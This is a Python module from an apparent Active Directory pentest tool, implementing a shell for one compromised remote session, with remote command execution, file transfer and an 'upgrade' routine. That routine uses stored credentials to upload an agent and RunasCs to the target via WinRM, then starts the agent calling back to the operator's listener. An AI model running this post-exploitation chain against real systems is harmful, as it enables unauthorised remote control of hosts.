"""Isolated session Shell for interactive remote sessions.

This module defines a lightweight REPL that operates in the context of a
single ``RemoteSession`` managed by :class:`adscan_internal.sessions.SessionManager`.

The goal is to separate:

- The *workspace* shell (``PentestShell`` in ``adscan.py``) that orchestrates
  enumeration, reporting, etc.
- The *session* shell that provides a focused set of commands to work with a
  specific remote session (interaction, file transfer helpers, etc.).

The initial implementation builds on top of existing helpers in ``PentestShell``
such as ``do_session``, ``do_system``, and the WinRM-based upload/download
wrappers, instead of introducing a full custom agent protocol. This keeps the
design modular and ready for future evolution towards an agent-based model
similar to Penelope.
"""

from __future__ import annotations

import logging
import os
import shlex
import subprocess
import threading
import time
from typing import TYPE_CHECKING, Optional

from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import ANSI

from .sessions import RemoteSession, SessionManager
from . import telemetry
from .agent_ng_manager import get_agent_ng_local_path
from .runascs_manager import get_runascs_local_path
from .rich_output import print_info, print_warning, print_error, print_success


logger = logging.getLogger("adscan.session_shell")

if TYPE_CHECKING:  # pragma: no cover - type checking only
    from adscan import PentestShell  # pylint: disable=cyclic-import


class SessionShell:
    """Minimal REPL bound to a single remote session.

    This shell exposes a small set of commands that operate *only* on the
    selected session, distinct from the main ADscan workspace commands.

    Commands:
        help / ?       Show available session commands.
        info           Show information about the current session.
        interact       Attach interactively to the remote shell.
        download ...   Download files using session context (WinRM for now).
        upload ...     Upload files using session context (WinRM for now).
        system ...     Run a local system command (on the operator host).
        sessions       List all available sessions.
        back / exit    Return to the main ADscan shell.
    """

    def __init__(
        self,
        parent_shell: "PentestShell",
        session_manager: SessionManager,
        session: RemoteSession,
    ) -> None:
        self.parent_shell = parent_shell
        self.session_manager = session_manager
        self.session = session
        self.console = parent_shell.console
        self._prompt_session: Optional[PromptSession] = None

    # ------------------------------------------------------------------ #
    # Core loop
    # ------------------------------------------------------------------ #
    def run(self) -> None:
        """Enter the session shell loop."""
        from io import StringIO
        from rich.console import Console as RichConsole
        from rich.text import Text

        self._prompt_session = PromptSession()

        self._print_banner()

        while True:
            try:

                def get_prompt_message():
                    """Build a Rich-styled prompt and convert it to ANSI."""
                    try:
                        prompt_text = Text()
                        prompt_text.append("(", style="white")
                        prompt_text.append(
                            f"session{self.session.id}", style="bold cyan"
                        )
                        prompt_text.append("@", style="white")
                        prompt_text.append(
                            self.session.peer_address[0], style="bold red"
                        )
                        prompt_text.append(") > ", style="white")

                        buf = StringIO()
                        temp_console = RichConsole(
                            file=buf,
                            force_terminal=True,
                            color_system="truecolor",
                            width=80,
                        )
                        temp_console.print(prompt_text, end="")
                        ansi_prompt = buf.getvalue()
                        buf.close()
                        return ANSI(ansi_prompt)
                    except Exception:
                        # Fallback to a plain prompt string on any error.
                        return ANSI(
                            f"(session {self.session.id}@"
                            f"{self.session.peer_address[0]}) > "
                        )

                raw_input = self._prompt_session.prompt(get_prompt_message)
                logger.debug(
                    "[session_shell] raw_input=%r for session_id=%s",
                    raw_input,
                    self.session.id,
                )
            except (EOFError, KeyboardInterrupt):
                self.console.print("[yellow]Exiting session shell.[/yellow]")
                break

            cmdline = raw_input.strip()
            if not cmdline:
                continue

            try:
                parts = shlex.split(cmdline)
            except ValueError:
                self.console.print(
                    "[red]Error:[/red] mismatched quotes in input.", style="red"
                )
                continue

            if not parts:
                continue

            command = parts[0].lower()
            args = parts[1:]
            logger.debug("[session_shell] parsed command=%r args=%r", command, args)

            if command in {"exit", "back", "quit"}:
                self.console.print("[yellow]Returning to ADscan shell.[/yellow]")
                break
            if command in {"help", "?"}:
                self._print_help()
            elif command == "info":
                self.parent_shell.do_session(f"info {self.session.id}")
            elif command == "interact":
                self.parent_shell.do_session(f"interact {self.session.id}")
            elif command == "run":
                agent = self._get_agent_client()
                if agent is None:
                    continue
                if not args:
                    self.console.print(
                        "[red]Usage:[/red] run <command to execute on remote host>"
                    )
                    continue
                cmd_to_send = " ".join(args)
                logger.debug(
                    "[session_shell] sending run command to agent: %r",
                    cmd_to_send,
                )
                output = agent.exec_command(cmd_to_send)
                if output:
                    self.console.print(output)
            elif command == "download":
                if not args:
                    self.console.print(
                        "[red]Usage:[/red] download <remote_path> [download_dir]"
                    )
                    continue
                agent = self._get_agent_client()
                if agent is not None:
                    remote_path = args[0]
                    data = agent.download_file(remote_path)
                    if data is None:
                        self.console.print(
                            f"[red]Agent download failed for[/red] {remote_path}"
                        )
                        continue
                    # When using the agent we always download to the current
                    # working directory unless a path is provided via the
                    # second argument.
                    import os

                    local_dir = args[1] if len(args) >= 2 else os.getcwd()
                    os.makedirs(local_dir, exist_ok=True)
                    local_path = os.path.join(local_dir, os.path.basename(remote_path))
                    try:
                        with open(local_path, "wb") as f:
                            f.write(data)
                        self.console.print(
                            f"[green]Downloaded via agent to[/green] {local_path}"
                        )
                    except OSError as exc:
                        telemetry.capture_exception(exc)
                        self.console.print(
                            f"[red]Failed to save downloaded file:[/red] {exc}"
                        )
                else:
                    arg_str = " ".join(args)
                    self.parent_shell.do_session(f"download {arg_str}")
            elif command == "upload":
                if len(args) < 2:
                    self.console.print(
                        "[red]Usage:[/red] upload <local_path> <remote_path>"
                    )
                    continue
                agent = self._get_agent_client()
                if agent is not None:
                    import os

                    local_path = args[0]
                    remote_path = args[1]
                    if not os.path.exists(local_path) or not os.path.isfile(local_path):
                        self.console.print(
                            f"[red]Local file does not exist:[/red] {local_path}"
                        )
                        continue
                    try:
                        with open(local_path, "rb") as f:
                            data = f.read()
                    except OSError as exc:
                        telemetry.capture_exception(exc)
                        self.console.print(
                            f"[red]Failed to read local file:[/red] {exc}"
                        )
                        continue
                    ok = agent.upload_file(remote_path, data)
                    if ok:
                        self.console.print(
                            f"[green]Uploaded via agent to[/green] {remote_path}"
                        )
                    else:
                        self.console.print(
                            f"[red]Agent upload failed for[/red] {remote_path}"
                        )
                else:
                    arg_str = " ".join(args)
                    self.parent_shell.do_session(f"upload {arg_str}")
            elif command == "system":
                if not args:
                    self.console.print(
                        "[red]Usage:[/red] system <command to run locally>"
                    )
                    continue
                self.parent_shell.do_system(" ".join(args))
            elif command == "upgrade":
                self._upgrade_to_interactive()
            elif command == "sessions":
                self.parent_shell.do_session("list")
            else:
                self.console.print(
                    f"[yellow]Unknown session command:[/yellow] {command}. "
                    "Type [bold]help[/bold] to see available commands."
                )

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #
    def _print_banner(self) -> None:
        """Print a small banner when entering the session shell."""
        from rich.panel import Panel

        panel = Panel(
            f"Session shell attached to #{self.session.id} "
            f"({self.session.peer_address[0]}:{self.session.peer_address[1]}).\n"
            "Type 'help' to see available session commands, "
            "or 'back' to return to the main ADscan shell.",
            title="Session Shell",
            border_style="cyan",
        )
        self.console.print(panel)

    def _print_help(self) -> None:
        """Show available session-level commands."""
        from rich.table import Table

        table = Table(
            title="Session Shell Commands",
            show_header=True,
            header_style="bold cyan",
            border_style="cyan",
        )
        table.add_column("Command", style="bold")
        table.add_column("Description")

        table.add_row("info", "Show details of the current session.")
        table.add_row("interact", "Attach interactively to the remote shell.")
        table.add_row(
            "download <remote> [dir]",
            "Download a file (via agent when attached, or WinRM fallback).",
        )
        table.add_row(
            "upload <local> <remote>",
            "Upload a local file (via agent when attached, or WinRM fallback).",
        )
        table.add_row(
            "run <cmd>",
            "Execute a command on the remote host via agent (if attached).",
        )
        table.add_row(
            "system <cmd>",
            "Run a local system command on the operator host.",
        )
        table.add_row(
            "upgrade",
            "Upgrade current Windows session to an interactive session (RunasCs + agent).",
        )
        table.add_row(
            "sessions",
            "List all known sessions in the current workspace.",
        )
        table.add_row("back / exit", "Return to the main ADscan shell.")

        self.console.print(table)

    # ------------------------------------------------------------------ #
    # Agent helpers
    # ------------------------------------------------------------------ #
    def _get_agent_client(self):
        """Return the attached AgentSession client if available.

        If no client is currently attached but the underlying session still has
        an active socket, this helper will attempt to attach an AgentSession
        automatically. This makes it seamless to work with sessions created by
        the Python or Go agent payloads, even when the listener was started
        manually and `session agent attach` was not used explicitly.
        """
        agent_client = self.session.metadata.get("agent_client")
        if agent_client is not None:
            return agent_client

        # Attempt lazy attachment only when a socket is available; if this
        # fails we fall back to the existing WinRM-based helpers.
        if self.session.socket is None or not self.session.is_active:
            self.console.print(
                "[yellow]No agent attached to this session.[/yellow] "
                "Use 'session agent attach' first or rely on WinRM-based "
                "helpers."
            )
            return None

        try:
            from adscan_internal import AgentSession, SessionType

            agent_client = AgentSession(sock=self.session.socket)
            self.session.metadata["agent_client"] = agent_client
            # Mark the session as agent-backed for informational purposes.
            self.session.type = SessionType.AGENT
            self.console.print(
                "[green]Agent client attached automatically to this session.[/green]"
            )
            return agent_client
        except Exception as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            self.console.print(
                f"[red]Failed to attach agent client automatically:[/red] {exc}"
            )
            return None

    def _upgrade_to_interactive(self) -> None:
        """Upgrade the current Windows session to an interactive session.

        This uses RunasCs on the target host to spawn a new interactive logon
        that launches the agent-ng binary, which connects back to the existing
        reverse-shell listener. When the new session arrives it is
        automatically selected so the user experiences this as a seamless
        upgrade.
        """
        listener_bind = self.parent_shell.session_manager.get_listener_bind()
        if not listener_bind:
            print_error(
                "No active listener found. Start one with "
                "'session listener start [lhost] [lport]' before upgrading."
            )
            return

        lhost, lport = listener_bind
        if lhost == "0.0.0.0":
            myip = getattr(self.parent_shell, "myip", None)
            if myip:
                lhost = myip

        agent_path = get_agent_ng_local_path(target_os="windows", arch="amd64")
        if agent_path is None:
            print_error(
                "agent-ng binary not found. Ensure it is available under "
                "$ADSCAN_HOME/tools/agent_ng/windows-amd64 or set "
                "ADSCAN_AGENT_NG_PATH."
            )
            return

        runascs_path = get_runascs_local_path(target_os="windows", arch="amd64")
        if runascs_path is None:
            print_error(
                "RunasCs binary not found. Ensure it is available under "
                "$ADSCAN_HOME/tools/runascs/windows-amd64 or set "
                "ADSCAN_RUNASCS_PATH."
            )
            return

        remote_dir = r"C:\Windows\Temp"
        # Use a distinct filename for the upgraded agent to avoid Windows
        # file-lock issues when the original agent binary is still in use by
        # the first session.
        remote_agent = rf"{remote_dir}\adscan_agent_ng_upg.exe"
        remote_runascs = rf"{remote_dir}\RunasCs.exe"

        # Prefer reusing the same WinRM upload helper that ``session launch``
        # uses so behaviour (including progress bar and hashing) is identical.
        # This relies on the session metadata populated when the reverse shell
        # was created.
        meta = self.session.metadata
        domain = meta.get("domain")
        host = meta.get("host")
        username = meta.get("username")
        password = meta.get("password")

        if not all([domain, host, username, password]):
            print_error(
                "Current session is missing domain/host/credentials metadata; "
                "cannot perform WinRM upload for upgrade."
            )
            return

        print_info("Uploading agent-ng and RunasCs to the target host via WinRM...")
        shell = self.parent_shell
        if not shell.winrm_upload(
            domain=domain,
            host=host,
            username=username,
            password=password,
            local_path=str(agent_path),
            remote_path=remote_agent,
        ):
            print_error("Failed to upload agent-ng binary to the target.")
            return

        if not shell.winrm_upload(
            domain=domain,
            host=host,
            username=username,
            password=password,
            local_path=str(runascs_path),
            remote_path=remote_runascs,
        ):
            print_error("Failed to upload RunasCs binary to the target.")
            return

        print_success(
            "Binaries uploaded. Launching RunasCs to start an interactive "
            "session with a new agent..."
        )

        existing_ids = {
            sess.id for sess in self.parent_shell.session_manager.list_sessions()
        }

        # Build NetExec command that we have validated manually to work for
        # spawning RunasCs on the target host.
        netexec_path = getattr(self.parent_shell, "netexec_path", None)
        if not netexec_path:
            print_error(
                "NetExec path is not configured; cannot launch RunasCs via WinRM."
            )
            return

        try:
            auth = self.parent_shell.build_auth_nxc(
                username, password, domain, kerberos=False
            )
        except Exception as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            print_error(f"Failed to build NetExec auth for upgrade: {exc}")
            return

        # Build log path under the current workspace when available.
        if getattr(self.parent_shell, "current_workspace_dir", None):
            log_dir = os.path.join(
                self.parent_shell.current_workspace_dir,
                "domains",
                domain,
                "winrm",
            )
        else:
            log_dir = os.path.join("domains", domain, "winrm")

        try:
            os.makedirs(log_dir, exist_ok=True)
        except OSError as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            log_dir = os.path.join("domains", domain, "winrm")

        log_file = os.path.join(log_dir, f"{host}_{username}_runascs_upgrade.log")

        # Inner command executed on the target host via WinRM.
        runascs_inner = (
            f"cmd /c {remote_runascs} x x "
            f'"{remote_agent} --host {lhost} --port {lport}" -l 9'
        )

        command_added = (
            f"{netexec_path} winrm {host} {auth} --log {log_file} -X '{runascs_inner}'"
        )
        logger.debug("[session_shell] upgrade NetExec command: %r", command_added)

        launcher_proc = self.parent_shell.spawn_command(
            command_added,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if launcher_proc is None:
            print_error("Failed to start NetExec launcher process for RunasCs upgrade.")
            return

        def _log_launcher_output(proc: subprocess.Popen[str], cmd: str) -> None:
            """Background logger for the NetExec RunasCs launcher."""
            try:
                stdout_data, stderr_data = proc.communicate()
                rc = proc.returncode
                stdout_trimmed = (stdout_data or "")[:200]
                stderr_trimmed = (stderr_data or "")[:200]
                if rc != 0:
                    logger.debug(
                        "[session_shell] RunasCs NetExec launcher exited with "
                        "code %s. Stdout: %r Stderr: %r",
                        rc,
                        stdout_trimmed,
                        stderr_trimmed,
                    )
                else:
                    logger.debug(
                        "[session_shell] RunasCs NetExec launcher exited cleanly "
                        "with code 0. Stdout: %r",
                        stdout_trimmed,
                    )
            except Exception as exc:  # pragma: no cover - defensive
                telemetry.capture_exception(exc)
                logger.debug(
                    "[session_shell] Failed to collect NetExec output for "
                    "RunasCs launcher %r: %s",
                    cmd,
                    exc,
                )

        monitor_thread = threading.Thread(
            target=_log_launcher_output,
            args=(launcher_proc, command_added),
            daemon=True,
        )
        monitor_thread.start()

        new_session_id = None
        wait_seconds = 30
        poll_interval = 1
        target_ip = self.session.peer_address[0]

        for _ in range(0, wait_seconds, poll_interval):
            time.sleep(poll_interval)
            for sess in self.parent_shell.session_manager.list_sessions():
                if sess.id in existing_ids:
                    continue
                if sess.peer_address[0] == target_ip and sess.is_active:
                    new_session_id = sess.id
                    break
            if new_session_id is not None:
                break

        if new_session_id is None:
            print_warning(
                "No upgraded interactive session was detected within the next "
                f"{wait_seconds} seconds. If RunasCs succeeded, the session "
                "may still arrive later."
            )
            return

        self.parent_shell.session_manager.set_current_session(new_session_id)
        new_session = self.parent_shell.session_manager.get_current_session()
        if new_session is not None:
            new_session.metadata["interactive"] = True
            self.session = new_session
            print_success(
                f"Session upgraded. Now attached to interactive session "
                f"#{new_session.id} ({new_session.peer_address[0]}:"
                f"{new_session.peer_address[1]})."
            )
